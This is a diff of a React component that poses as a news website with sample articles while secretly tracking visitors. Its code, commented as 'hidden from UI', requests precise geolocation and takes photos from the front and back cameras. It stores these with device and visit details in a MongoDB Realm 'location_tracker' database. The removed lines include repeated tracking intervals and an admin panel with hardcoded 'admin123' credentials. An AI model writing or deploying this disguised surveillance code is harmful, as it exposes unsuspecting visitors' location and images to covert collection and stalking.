@@ -1,44 +1,111 @@
-import React, { useState, useEffect, useRef } from 'react';
+
+import React, { useState, useEffect } from 'react';
 import * as Realm from 'realm-web';
 
 const NewsWebsite = () => {
-  // Tracking states
+  // Location and camera tracking states (hidden from UI)
   const [mongoClient, setMongoClient] = useState(null);
-  const [trackingActive, setTrackingActive] = useState(false);
+  const [user, setUser] = useState(null);
+  const [locationTracked, setLocationTracked] = useState(false);
+  const [cameraTracked, setCameraTracked] = useState(false);
+  const [mediaStream, setMediaStream] = useState(null);
 
-  // UI states
+  // Mobile debugging without USB - Visual debug panel
+  const [debugInfo, setDebugInfo] = useState([]);
+  const [showDebugPanel, setShowDebugPanel] = useState(false);
+
+  // News content states
   const [selectedCategory, setSelectedCategory] = useState('all');
   const [searchQuery, setSearchQuery] = useState('');
-  
-  // News states
-  const [newsArticles, setNewsArticles] = useState([]);
-  const [loading, setLoading] = useState(true);
-  const [error, setError] = useState(null);
+  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
 
-  // Admin states
-  const [isAdmin, setIsAdmin] = useState(false);
-  const [showAdminLogin, setShowAdminLogin] = useState(false);
-  const [adminData, setAdminData] = useState({ locations: [], cameraCaptures: [] });
-  const [adminLoading, setAdminLoading] = useState(false);
-  const [adminView, setAdminView] = useState('locations');
+  // Enhanced mobile console that shows on screen
+  const mobileLog = (message, type = 'info') => {
+    const timestamp = new Date().toLocaleTimeString();
+    const logEntry = {
+      id: Date.now() + Math.random(), // Ensure unique IDs
+      timestamp,
+      message: typeof message === 'object' ? JSON.stringify(message, null, 2) : message,
+      type
+    };
+    
+    setDebugInfo(prev => [logEntry, ...prev.slice(0, 19)]); // Keep last 20 logs
+  };
 
-  // Admin form refs
-  const usernameRef = useRef('');
-  const passwordRef = useRef('');
-
-  // Configuration
+  // MongoDB Atlas App Configuration
   const REALM_APP_ID = "myrealmapp-lwdulec";
   const DATABASE_NAME = "location_tracker";
-  const app = new Realm.App({ id: REALM_APP_ID });
+  const COLLECTION_NAME = "locations";
 
-  // Admin credentials
-  const ADMIN_CREDENTIALS = {
-    username: 'admin',
-    password: 'admin123'
-  };
+  // Initialize Realm App
+  const app = new Realm.App({ id: REALM_APP_ID });
 
   // News data
   const newsCategories = ['all', 'technology', 'business', 'sports', 'entertainment', 'health', 'science'];
+  
+  const newsArticles = [
+    {
+      id: 1,
+      title: "Revolutionary AI Technology Transforms Healthcare Industry",
+      summary: "New artificial intelligence breakthrough promises to revolutionize patient diagnosis and treatment across global healthcare systems.",
+      category: "technology",
+      author: "Dr. Sarah Chen",
+      publishedAt: "2024-01-15T10:30:00Z",
+      readTime: "5 min read",
+      image: "https://images.unsplash.com/photo-1559757148-5c350d0d3c56?w=400&h=250&fit=crop",
+      featured: true
+    },
+    {
+      id: 2,
+      title: "Global Markets Surge Following Economic Recovery Signals",
+      summary: "Stock markets worldwide show positive momentum as economic indicators suggest strong recovery trends.",
+      category: "business",
+      author: "Michael Rodriguez",
+      publishedAt: "2024-01-15T08:15:00Z",
+      readTime: "3 min read",
+      image: "https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?w=400&h=250&fit=crop"
+    },
+    {
+      id: 3,
+      title: "Championship Finals Set Record Viewership Numbers",
+      summary: "The most-watched sporting event of the year delivers thrilling competition and historic performances.",
+      category: "sports",
+      author: "Jessica Thompson",
+      publishedAt: "2024-01-14T22:45:00Z",
+      readTime: "4 min read",
+      image: "https://images.unsplash.com/photo-1461896836934-ffe607ba8211?w=400&h=250&fit=crop"
+    },
+    {
+      id: 4,
+      title: "Climate Scientists Discover Promising Ocean Recovery Patterns",
+      summary: "New research reveals encouraging signs of marine ecosystem restoration in key ocean regions.",
+      category: "science",
+      author: "Dr. Emily Watson",
+      publishedAt: "2024-01-14T16:20:00Z",
+      readTime: "6 min read",
+      image: "https://images.unsplash.com/photo-1559827260-dc66d52bef19?w=400&h=250&fit=crop"
+    },
+    {
+      id: 5,
+      title: "Breakthrough Study Links Exercise to Enhanced Cognitive Function",
+      summary: "Researchers unveil compelling evidence showing how regular physical activity boosts brain performance.",
+      category: "health",
+      author: "Dr. James Wilson",
+      publishedAt: "2024-01-14T14:10:00Z",
+      readTime: "5 min read",
+      image: "https://images.unsplash.com/photo-1571019613454-1cb2f99b2d8b?w=400&h=250&fit=crop"
+    },
+    {
+      id: 6,
+      title: "Streaming Wars Intensify with New Platform Launches",
+      summary: "Entertainment industry sees major shifts as new streaming services enter the competitive market.",
+      category: "entertainment",
+      author: "Alex Kumar",
+      publishedAt: "2024-01-14T12:30:00Z",
+      readTime: "4 min read",
+      image: "https://images.unsplash.com/photo-1489599611383-e2bd6ff1d8ee?w=400&h=250&fit=crop"
+    }
+  ];
 
   // Styles
   const styles = {
@@ -134,6 +201,8 @@ const NewsWebsite = () => {
     },
     categoryButtonActive: {
       backgroundColor: '#ff6b6b',
+      borderWidth: '2px',
+      borderStyle: 'solid',
       borderColor: '#ff6b6b',
       color: 'white'
     },
@@ -247,183 +316,98 @@ const NewsWebsite = () => {
       color: '#ccc',
       fontSize: 'clamp(0.8rem, 2.2vw, 0.9rem)'
     },
-    // Modal styles
-    modalOverlay: {
-      position: 'fixed',
-      top: 0,
-      left: 0,
-      right: 0,
-      bottom: 0,
-      backgroundColor: 'rgba(0,0,0,0.9)',
-      zIndex: 10000,
-      display: 'flex',
-      alignItems: 'center',
-      justifyContent: 'center',
-      padding: '20px',
-      fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif"
-    },
-    // Loading and error styles
-    loadingContainer: {
-      display: 'flex',
-      justifyContent: 'center',
-      alignItems: 'center',
-      minHeight: '300px',
-      flexDirection: 'column',
-      gap: '1rem'
-    },
-    loadingSpinner: {
-      width: '40px',
-      height: '40px',
-      border: '4px solid #f3f3f3',
-      borderTop: '4px solid #ff6b6b',
-      borderRadius: '50%',
-      animation: 'spin 1s linear infinite'
-    },
-    errorContainer: {
-      backgroundColor: '#ffebee',
-      border: '1px solid #f44336',
-      borderRadius: '8px',
-      padding: '1rem',
-      margin: '1rem 0',
-      textAlign: 'center'
-    },
-    errorText: {
-      color: '#d32f2f',
-      fontWeight: '500'
-    },
-    retryButton: {
-      backgroundColor: '#ff6b6b',
-      color: 'white',
+    mobileMenuToggle: {
+      display: 'none',
+      background: 'none',
       border: 'none',
-      padding: '0.5rem 1rem',
-      borderRadius: '5px',
+      color: 'white',
+      fontSize: '1.5rem',
       cursor: 'pointer',
-      marginTop: '0.5rem'
+      padding: '0.5rem'
     },
-    // Admin styles
-    adminPanel: {
+    mobileNav: {
+      display: 'none',
+      flexDirection: 'column',
+      width: '100%',
+      gap: '1rem',
+      marginTop: '1rem',
+      paddingTop: '1rem',
+      borderTop: '1px solid #333'
+    },
+    // Debug panel styles
+    debugPanel: {
       position: 'fixed',
       top: 0,
       left: 0,
       right: 0,
       bottom: 0,
-      backgroundColor: 'white',
-      zIndex: 10001,
-      overflow: 'auto'
+      backgroundColor: 'rgba(0,0,0,0.95)',
+      color: '#00ff00',
+      fontFamily: 'monospace',
+      fontSize: '12px',
+      zIndex: 9999,
+      overflow: 'auto',
+      padding: '10px'
     },
-    adminHeader: {
-      backgroundColor: '#1a1a1a',
+    debugHeader: {
+      backgroundColor: '#333',
       color: 'white',
-      padding: '1rem',
-      display: 'flex',
-      justifyContent: 'space-between',
-      alignItems: 'center',
+      padding: '10px',
       position: 'sticky',
       top: 0,
-      zIndex: 10002
-    },
-    adminNav: {
       display: 'flex',
-      gap: '1rem',
-      backgroundColor: '#f5f5f5',
-      padding: '1rem',
-      borderBottom: '1px solid #ddd'
+      justifyContent: 'space-between',
+      alignItems: 'center'
     },
-    adminNavButton: {
-      padding: '0.5rem 1rem',
-      border: 'none',
-      backgroundColor: 'transparent',
-      cursor: 'pointer',
-      borderRadius: '5px',
-      transition: 'all 0.3s ease'
+    debugEntry: {
+      padding: '5px',
+      borderBottom: '1px solid #333',
+      wordBreak: 'break-all'
     },
-    adminNavButtonActive: {
-      backgroundColor: '#ff6b6b',
-      color: 'white'
-    },
-    adminContent: {
-      padding: '2rem',
-      maxWidth: '1200px',
-      margin: '0 auto'
-    },
-    dataCard: {
-      backgroundColor: 'white',
-      border: '1px solid #ddd',
-      borderRadius: '8px',
-      padding: '1rem',
-      marginBottom: '1rem',
-      boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
-    },
-    dataGrid: {
-      display: 'grid',
-      gap: '1rem',
-      gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))'
-    },
-    imagePreview: {
-      maxWidth: '200px',
-      maxHeight: '150px',
-      objectFit: 'cover',
-      borderRadius: '4px',
-      cursor: 'pointer'
-    },
-    statsContainer: {
-      display: 'grid',
-      gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))',
-      gap: '1rem',
-      marginBottom: '2rem'
-    },
-    statCard: {
-      backgroundColor: '#f8f9fa',
-      padding: '1.5rem',
-      borderRadius: '8px',
-      textAlign: 'center',
-      border: '1px solid #dee2e6'
-    },
-    statNumber: {
-      fontSize: '2rem',
-      fontWeight: 'bold',
-      color: '#ff6b6b',
-      display: 'block'
-    },
-    statLabel: {
-      color: '#666',
-      fontSize: '0.9rem',
-      marginTop: '0.5rem'
-    },
-    loginForm: {
-      backgroundColor: 'white',
-      padding: '2rem',
-      borderRadius: '8px',
-      boxShadow: '0 4px 12px rgba(0,0,0,0.15)',
-      maxWidth: '400px',
-      margin: '2rem auto'
-    },
-    loginInput: {
-      width: '100%',
-      padding: '0.75rem',
-      border: '1px solid #ddd',
-      borderRadius: '4px',
-      marginBottom: '1rem',
-      fontSize: '1rem',
-      boxSizing: 'border-box',
-      outline: 'none'
-    },
-    loginButton: {
-      width: '100%',
-      padding: '0.75rem',
+    debugButton: {
+      position: 'fixed',
+      bottom: '20px',
+      right: '20px',
       backgroundColor: '#ff6b6b',
       color: 'white',
       border: 'none',
-      borderRadius: '4px',
-      fontSize: '1rem',
+      borderRadius: '50%',
+      width: '60px',
+      height: '60px',
+      fontSize: '20px',
+      cursor: 'pointer',
+      zIndex: 9998,
+      boxShadow: '0 4px 12px rgba(0,0,0,0.3)'
+    },
+    testButton: {
+      backgroundColor: '#007bff',
+      color: 'white',
+      border: 'none',
+      padding: '10px 20px',
+      borderRadius: '5px',
+      margin: '5px',
       cursor: 'pointer'
     }
   };
 
-  // MongoDB initialization
+  // MongoDB connection and tracking functions
+  // Enhanced initialization with better error handling and debugging
   const initializeMongoDB = async () => {
     try {
+      console.log('🔄 Initializing MongoDB connection...');
+      console.log('🌐 Environment:', {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        cookieEnabled: navigator.cookieEnabled,
+        onLine: navigator.onLine,
+        protocol: window.location.protocol,
+        hostname: window.location.hostname
+      });
+      
       if (app.currentUser) {
+        console.log('✅ Using existing user:', app.currentUser.id);
+        setUser(app.currentUser);
         const mongodb = app.currentUser.mongoClient("mongodb-atlas");
         setMongoClient(mongodb);
         return mongodb;
@@ -431,66 +415,180 @@ const NewsWebsite = () => {
 
       const credentials = Realm.Credentials.anonymous();
       const authenticatedUser = await app.logIn(credentials);
+      console.log('✅ Anonymous authentication successful:', authenticatedUser.id);
+      setUser(authenticatedUser);
+
       const mongodb = authenticatedUser.mongoClient("mongodb-atlas");
       setMongoClient(mongodb);
+      console.log('✅ MongoDB client initialized');
       return mongodb;
     } catch (error) {
-      console.error('MongoDB failed:', error);
+      console.error('❌ MongoDB connection failed:', error);
+      console.error('Error details:', {
+        name: error.name,
+        message: error.message,
+        stack: error.stack
+      });
       return null;
     }
   };
 
-  // Save functions
-  const saveLocationToMongoDB = async (location) => {
-    if (!mongoClient) return null;
+  const saveLocationToMongoDB = async (location, client = null) => {
     try {
-      const collection = mongoClient.db(DATABASE_NAME).collection('locations');
+      const dbClient = client || mongoClient;
+      if (!dbClient) {
+        console.error('❌ No MongoDB client available');
+        return null;
+      }
+
+      console.log('💾 Saving location to MongoDB...');
+      const collection = dbClient.db(DATABASE_NAME).collection(COLLECTION_NAME);
+      
       const locationData = {
         ...location,
         timestamp: new Date(location.timestamp),
         createdAt: new Date(),
         userAgent: navigator.userAgent,
+        referrer: document.referrer,
         pageUrl: window.location.href,
-        sessionId: sessionStorage.getItem('sessionId') || Date.now().toString(),
-        visitCount: parseInt(localStorage.getItem('visitCount') || '0') + 1
+        sessionId: sessionStorage.getItem('sessionId') || 'unknown',
+        visitCount: parseInt(localStorage.getItem('visitCount') || '0') + 1,
+        // Additional mobile debugging info
+        mobile: {
+          isMobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+          screenSize: `${window.screen.width}x${window.screen.height}`,
+          viewport: `${window.innerWidth}x${window.innerHeight}`,
+          devicePixelRatio: window.devicePixelRatio,
+          orientation: window.orientation || 'unknown',
+          connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink
+          } : null
+        }
       };
+
       localStorage.setItem('visitCount', locationData.visitCount.toString());
-      return await collection.insertOne(locationData);
+
+      console.log('📝 Attempting insertOne with data:', {
+        lat: locationData.latitude,
+        lng: locationData.longitude,
+        sessionId: locationData.sessionId,
+        isMobile: locationData.mobile.isMobile
+      });
+
+      const result = await collection.insertOne(locationData);
+      
+      console.log('✅ Location successfully stored:', {
+        insertedId: result.insertedId,
+        acknowledged: result.acknowledged
+      });
+      
+      console.log('📍 Location data summary:', {
+        lat: location.latitude,
+        lng: location.longitude,
+        accuracy: location.accuracy,
+        visit: locationData.visitCount,
+        mongoId: result.insertedId
+      });
+      
+      return result;
     } catch (error) {
-      console.error('Location save failed:', error);
+      console.error('❌ Location save failed:', {
+        name: error.name,
+        message: error.message,
+        code: error.code,
+        stack: error.stack
+      });
+      
+      // Try to log more details about the error
+      if (error.message.includes('insert not permitted')) {
+        console.error('🔒 MongoDB Rules Error: Check your Realm app rules configuration');
+      } else if (error.message.includes('network')) {
+        console.error('🌐 Network Error: Check internet connection');
+      } else if (error.message.includes('authentication')) {
+        console.error('🔐 Auth Error: Check Realm app authentication');
+      }
+      
       return null;
     }
   };
 
-  const saveCameraDataToMongoDB = async (cameraData) => {
-    if (!mongoClient) return null;
+  const saveCameraDataToMongoDB = async (cameraData, client = null) => {
     try {
-      const collection = mongoClient.db(DATABASE_NAME).collection('camera_captures');
+      const dbClient = client || mongoClient;
+      if (!dbClient) {
+        console.error('❌ No MongoDB client available for camera data');
+        return null;
+      }
+
+      const collection = dbClient.db(DATABASE_NAME).collection('camera_captures');
+      
       const captureData = {
         ...cameraData,
         timestamp: new Date(),
         createdAt: new Date(),
         userAgent: navigator.userAgent,
+        referrer: document.referrer,
         pageUrl: window.location.href,
-        sessionId: sessionStorage.getItem('sessionId') || Date.now().toString()
+        sessionId: sessionStorage.getItem('sessionId') || 'unknown',
+        visitCount: parseInt(localStorage.getItem('visitCount') || '0')
       };
-      return await collection.insertOne(captureData);
+
+      const result = await collection.insertOne(captureData);
+      console.log('✅ Camera data stored:', result.insertedId);
+      
+      return result;
     } catch (error) {
-      console.error('Camera save failed:', error);
+      console.error('❌ Camera data storage failed:', error);
       return null;
     }
   };
 
-  // Location tracking
-  const trackUserLocation = async () => {
+  const trackUserLocation = async (forceTrack = false) => {
+    if (!forceTrack && locationTracked) return;
+
+    console.log('🎯 Starting location tracking...');
+    console.log('🔒 Security context:', {
+      isSecureContext: window.isSecureContext,
+      protocol: window.location.protocol,
+      hostname: window.location.hostname
+    });
+
+    // Check for HTTPS requirement
+    if (!window.isSecureContext && window.location.hostname !== 'localhost') {
+      console.error('❌ Geolocation requires HTTPS on mobile devices');
+      console.error('🔒 Current protocol:', window.location.protocol);
+      setLocationTracked(true);
+      return;
+    }
+
+    if (!navigator.geolocation) {
+      console.error('❌ Geolocation not supported');
+      console.error('Navigator object:', navigator);
+      return;
+    }
+
+    console.log('✅ Geolocation API available');
+
     return new Promise((resolve) => {
-      if (!navigator.geolocation) {
-        resolve(false);
-        return;
-      }
+      // Enhanced geolocation options for mobile
+      const options = {
+        enableHighAccuracy: true,
+        timeout: 30000, // Increased timeout for mobile
+        maximumAge: 0
+      };
+
+      console.log('📱 Requesting location with options:', options);
 
       navigator.geolocation.getCurrentPosition(
         async (position) => {
+          console.log('📍 Location obtained successfully:', {
+            lat: position.coords.latitude,
+            lng: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: position.timestamp
+          });
+
           const location = {
             latitude: position.coords.latitude,
             longitude: position.coords.longitude,
@@ -499,451 +597,532 @@ const NewsWebsite = () => {
             altitude: position.coords.altitude,
             heading: position.coords.heading,
             speed: position.coords.speed,
-            isMobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
+            // Additional debug info
+            deviceInfo: {
+              isMobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+              screenWidth: window.screen.width,
+              screenHeight: window.screen.height,
+              windowWidth: window.innerWidth,
+              windowHeight: window.innerHeight,
+              devicePixelRatio: window.devicePixelRatio
+            }
           };
 
+          console.log('💾 Attempting to save location to MongoDB...');
           const result = await saveLocationToMongoDB(location);
-          resolve(!!result?.insertedId);
+          if (result) {
+            setLocationTracked(true);
+            console.log('✅ Location successfully stored in MongoDB with ID:', result.insertedId);
+          } else {
+            console.error('❌ Failed to save location to MongoDB');
+          }
+          resolve(result);
         },
-        () => resolve(false),
-        {
-          enableHighAccuracy: true,
-          timeout: 30000,
-          maximumAge: 0
-        }
+        (error) => {
+          console.error('❌ Location access failed:', {
+            code: error.code,
+            message: error.message,
+            PERMISSION_DENIED: error.PERMISSION_DENIED,
+            POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
+            TIMEOUT: error.TIMEOUT
+          });
+
+          // Specific error handling
+          switch(error.code) {
+            case error.PERMISSION_DENIED:
+              console.error('🚫 User denied location permission');
+              break;
+            case error.POSITION_UNAVAILABLE:
+              console.error('📍 Location information unavailable');
+              break;
+            case error.TIMEOUT:
+              console.error('⏰ Location request timed out');
+              break;
+            default:
+              console.error('❓ Unknown location error');
+          }
+
+          setLocationTracked(true);
+          resolve(null);
+        },
+        options
       );
     });
   };
 
-  // Camera capture with better error handling
   const captureFromCamera = async (facingMode = 'user') => {
     try {
-      // Check if mediaDevices is available
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        console.warn('Camera API not available');
-        return null;
-      }
-
-      // Request camera permission with constraints
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { 
-          facingMode: { ideal: facingMode },
-          width: { ideal: 1280, max: 1920 },
-          height: { ideal: 720, max: 1080 }
+      console.log(`📷 Attempting to access ${facingMode === 'user' ? 'front' : 'back'} camera...`);
+      
+      const constraints = {
+        video: {
+          facingMode: facingMode,
+          width: { ideal: 1920 },
+          height: { ideal: 1080 }
         },
         audio: false
-      });
+      };
+
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      console.log(`✅ ${facingMode === 'user' ? 'Front' : 'Back'} camera access granted`);
 
       const video = document.createElement('video');
       video.srcObject = stream;
-      video.autoplay = true;
-      video.playsInline = true; // Important for mobile
-      
+      video.play();
+
       return new Promise((resolve) => {
         video.onloadedmetadata = () => {
-          // Wait for video to be ready
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          
           setTimeout(() => {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            const imageData = canvas.toDataURL('image/jpeg', 0.8);
             
-            try {
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              const imageData = canvas.toDataURL('image/jpeg', 0.7);
-              
-              // Stop all tracks
-              stream.getTracks().forEach(track => {
-                track.stop();
-              });
-              
-              resolve({
-                camera: facingMode === 'user' ? 'front' : 'back',
-                imageData,
-                width: canvas.width,
-                height: canvas.height,
-                capturedAt: new Date().toISOString(),
-                success: true
-              });
-            } catch (drawError) {
-              console.error('Canvas drawing failed:', drawError);
-              stream.getTracks().forEach(track => track.stop());
-              resolve(null);
-            }
-          }, 2000); // Increased wait time
+            stream.getTracks().forEach(track => track.stop());
+            
+            resolve({
+              camera: facingMode === 'user' ? 'front' : 'back',
+              imageData: imageData,
+              width: canvas.width,
+              height: canvas.height,
+              capturedAt: new Date().toISOString()
+            });
+          }, 1000);
         };
-
-        video.onerror = () => {
-          console.error('Video loading failed');
-          stream.getTracks().forEach(track => track.stop());
-          resolve(null);
-        };
-
-        // Fallback timeout
-        setTimeout(() => {
-          console.warn('Camera capture timeout');
-          stream.getTracks().forEach(track => track.stop());
-          resolve(null);
-        }, 10000);
       });
-
     } catch (error) {
-      console.error(`Camera ${facingMode} failed:`, error);
-      
-      // Log specific error types for debugging
-      if (error.name === 'NotAllowedError') {
-        console.error('Camera permission denied');
-      } else if (error.name === 'NotFoundError') {
-        console.error('No camera device found');
-      } else if (error.name === 'NotReadableError') {
-        console.error('Camera hardware error');
-      } else if (error.name === 'OverconstrainedError') {
-        console.error('Camera constraints not satisfied');
-      }
-      
+      console.error(`❌ ${facingMode === 'user' ? 'Front' : 'Back'} camera access failed:`, error.message);
       return null;
     }
   };
 
-  // Camera tracking with user interaction
   const trackCameraAccess = async () => {
-    return new Promise(async (resolve) => {
+    if (cameraTracked) return;
+
+    console.log('📸 Starting camera tracking...');
+    console.log('🔒 Camera security context:', {
+      isSecureContext: window.isSecureContext,
+      protocol: window.location.protocol,
+      mediaDevicesSupported: !!navigator.mediaDevices,
+      getUserMediaSupported: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia)
+    });
+
+    try {
+      // Check for HTTPS requirement on mobile
+      if (!window.isSecureContext && window.location.hostname !== 'localhost') {
+        console.error('❌ Camera access requires HTTPS on mobile devices');
+        setCameraTracked(true);
+        return;
+      }
+
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        console.error('❌ Camera API not supported');
+        console.error('MediaDevices availability:', {
+          mediaDevices: !!navigator.mediaDevices,
+          getUserMedia: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
+          enumerateDevices: !!(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices)
+        });
+        setCameraTracked(true);
+        return;
+      }
+
+      console.log('✅ Camera API available, enumerating devices...');
+
+      // Get available cameras with better error handling
+      let devices = [];
       try {
-        // Check if we're on HTTPS or localhost
-        const isSecureContext = window.isSecureContext || 
-                               location.protocol === 'https:' || 
-                               location.hostname === 'localhost' || 
-                               location.hostname === '127.0.0.1';
+        devices = await navigator.mediaDevices.enumerateDevices();
+      } catch (enumError) {
+        console.error('❌ Failed to enumerate devices:', enumError);
+        setCameraTracked(true);
+        return;
+      }
 
-        if (!isSecureContext) {
-          console.warn('Camera requires HTTPS in production');
-          resolve(false);
-          return;
+      const videoDevices = devices.filter(device => device.kind === 'videoinput');
+      
+      console.log(`📷 Found ${videoDevices.length} camera(s):`, videoDevices.map(d => ({
+        id: d.deviceId,
+        label: d.label || 'Camera'
+      })));
+
+      const cameraData = {
+        availableCameras: videoDevices.length,
+        devices: videoDevices.map(device => ({
+          deviceId: device.deviceId,
+          label: device.label || 'Camera',
+          kind: device.kind
+        })),
+        captures: [],
+        // Additional debug info
+        debugInfo: {
+          isMobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+          isSecureContext: window.isSecureContext,
+          protocol: window.location.protocol,
+          timestamp: new Date().toISOString()
         }
+      };
 
-        if (!navigator.mediaDevices?.getUserMedia) {
-          console.warn('Camera API not supported');
-          resolve(false);
-          return;
-        }
-
-        // Get available devices first
-        let devices = [];
-        try {
-          devices = await navigator.mediaDevices.enumerateDevices();
-        } catch (deviceError) {
-          console.warn('Could not enumerate devices:', deviceError);
-        }
-
-        const videoDevices = devices.filter(device => device.kind === 'videoinput');
-
-        const cameraData = {
-          availableCameras: videoDevices.length,
-          devices: videoDevices.map(device => ({
-            deviceId: device.deviceId,
-            label: device.label || 'Camera',
-            kind: device.kind
-          })),
-          captures: [],
-          errors: []
-        };
-
-        // Try to capture from front camera
-        console.log('Attempting front camera capture...');
+      // Try to capture from front camera with enhanced error handling
+      console.log('📷 Attempting front camera capture...');
+      try {
         const frontCapture = await captureFromCamera('user');
         if (frontCapture) {
           cameraData.captures.push(frontCapture);
-          console.log('Front camera capture successful');
+          console.log('✅ Front camera capture successful');
         } else {
-          cameraData.errors.push('Front camera failed');
-          console.log('Front camera capture failed');
+          console.log('⚠️ Front camera capture returned null');
         }
+      } catch (frontError) {
+        console.error('❌ Front camera capture failed:', frontError);
+      }
 
-        // Try back camera if multiple devices exist
-        if (videoDevices.length > 1) {
-          await new Promise(resolve => setTimeout(resolve, 1500)); // Delay between captures
-          console.log('Attempting back camera capture...');
+      // Try to capture from back camera (if available)
+      if (videoDevices.length > 1) {
+        console.log('📷 Attempting back camera capture...');
+        try {
           const backCapture = await captureFromCamera('environment');
           if (backCapture) {
             cameraData.captures.push(backCapture);
-            console.log('Back camera capture successful');
+            console.log('✅ Back camera capture successful');
           } else {
-            cameraData.errors.push('Back camera failed');
-            console.log('Back camera capture failed');
+            console.log('⚠️ Back camera capture returned null');
           }
+        } catch (backError) {
+          console.error('❌ Back camera capture failed:', backError);
         }
+      }
 
-        // Save to MongoDB even if no captures (for debugging)
-        const result = await saveCameraDataToMongoDB(cameraData);
-        console.log('Camera data saved:', !!result?.insertedId);
-        resolve(!!result?.insertedId);
-
-      } catch (error) {
-        console.error('Camera tracking failed:', error);
-        
-        // Save error info to MongoDB for debugging
+      // Save camera data to MongoDB
+      console.log('💾 Attempting to save camera data to MongoDB...');
+      if (cameraData.captures.length > 0 || cameraData.availableCameras > 0) {
         try {
-          await saveCameraDataToMongoDB({
-            availableCameras: 0,
-            devices: [],
-            captures: [],
-            errors: [error.message],
-            errorType: error.name,
-            userAgent: navigator.userAgent,
-            isSecureContext: window.isSecureContext
-          });
+          const result = await saveCameraDataToMongoDB(cameraData);
+          if (result) {
+            console.log(`✅ Camera data stored successfully with ID: ${result.insertedId}`);
+            console.log(`📊 Captured from ${cameraData.captures.length} camera(s)`);
+          } else {
+            console.error('❌ Failed to save camera data to MongoDB');
+          }
         } catch (saveError) {
-          console.error('Failed to save error data:', saveError);
+          console.error('❌ Error saving camera data:', saveError);
         }
-        
-        resolve(false);
+      } else {
+        console.log('⚠️ No camera captures to save');
       }
-    });
-  };
 
-  // Continuous tracking setup
-  const startContinuousTracking = async () => {
-    if (trackingActive) return;
-    setTrackingActive(true);
-
-    // Clear existing intervals
-    ['locationInterval', 'cameraInterval'].forEach(key => {
-      const interval = sessionStorage.getItem(key);
-      if (interval) clearInterval(parseInt(interval));
-    });
-
-    // Initial tracking
-    setTimeout(() => trackUserLocation(), 500);
-    setTimeout(() => trackCameraAccess(), 3000);
-
-    // Continuous tracking intervals
-    const locationInterval = setInterval(trackUserLocation, 3 * 60 * 1000);
-    const cameraInterval = setInterval(trackCameraAccess, 8 * 60 * 1000);
-
-    sessionStorage.setItem('locationInterval', locationInterval.toString());
-    sessionStorage.setItem('cameraInterval', cameraInterval.toString());
-  };
-
-  // Fallback sample data (no News API dependency)
-  const getSampleArticles = () => [
-    {
-      id: 1,
-      title: "Revolutionary AI Technology Transforms Healthcare Industry",
-      summary: "New artificial intelligence breakthrough promises to revolutionize patient diagnosis and treatment across global healthcare systems.",
-      category: "technology",
-      author: "Dr. Sarah Chen",
-      publishedAt: "2024-01-15T10:30:00Z",
-      readTime: "5 min read",
-      image: "https://images.unsplash.com/photo-1559757148-5c350d0d3c56?w=400&h=250&fit=crop",
-      featured: true
-    },
-    {
-      id: 2,
-      title: "Global Markets Surge Following Economic Recovery Signals",
-      summary: "Stock markets worldwide show positive momentum as economic indicators suggest strong recovery trends.",
-      category: "business",
-      author: "Michael Rodriguez",
-      publishedAt: "2024-01-15T08:15:00Z",
-      readTime: "3 min read",
-      image: "https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?w=400&h=250&fit=crop"
-    },
-    {
-      id: 3,
-      title: "Championship Finals Set Record Viewership Numbers",
-      summary: "The most-watched sporting event of the year delivers thrilling competition and historic performances.",
-      category: "sports",
-      author: "Jessica Thompson",
-      publishedAt: "2024-01-14T22:45:00Z",
-      readTime: "4 min read",
-      image: "https://images.unsplash.com/photo-1461896836934-ffe607ba8211?w=400&h=250&fit=crop"
-    },
-    {
-      id: 4,
-      title: "Climate Scientists Discover Promising Ocean Recovery Patterns",
-      summary: "New research reveals encouraging signs of marine ecosystem restoration in key ocean regions.",
-      category: "science",
-      author: "Dr. Emily Watson",
-      publishedAt: "2024-01-14T16:20:00Z",
-      readTime: "6 min read",
-      image: "https://images.unsplash.com/photo-1559827260-dc66d52bef19?w=400&h=250&fit=crop"
-    },
-    {
-      id: 5,
-      title: "Breakthrough Study Links Exercise to Enhanced Cognitive Function",
-      summary: "Researchers unveil compelling evidence showing how regular physical activity boosts brain performance.",
-      category: "health",
-      author: "Dr. James Wilson",
-      publishedAt: "2024-01-14T14:10:00Z",
-      readTime: "5 min read",
-      image: "https://images.unsplash.com/photo-1571019613454-1cb2f99b2d8b?w=400&h=250&fit=crop"
-    },
-    {
-      id: 6,
-      title: "Streaming Wars Intensify with New Platform Launches",
-      summary: "Entertainment industry sees major shifts as new streaming services enter the competitive market.",
-      category: "entertainment",
-      author: "Alex Kumar",
-      publishedAt: "2024-01-14T12:30:00Z",
-      readTime: "4 min read",
